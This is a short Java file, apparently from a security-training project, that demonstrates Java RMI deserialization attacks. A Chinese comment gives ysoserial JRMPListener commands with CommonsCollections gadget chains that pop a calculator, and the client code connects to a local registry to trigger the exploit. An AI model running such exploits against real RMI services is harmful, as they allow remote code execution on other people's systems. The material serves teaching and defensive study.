package com.madaha.codesecone.controller.AdvancedAttack.deserialize.rmiDeserialize;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class FromAttackRegistry_ysoserial_Client_Success {

    /**
     * 注册中心攻击客户端与服务端:
     *    (1) 可以用ysoserial生成一个恶意的注册中心，当调用注册中心的方法时，就可以进行恶意利用。
     *       java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'open /System/Applications/Calculator.app'
     *
     * @poc1  java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 calc
     * @poc2  java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 calc
     */

    public static void main(String[] args) throws Exception{
        Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 1099);
        registry_remote.list();
    }
}
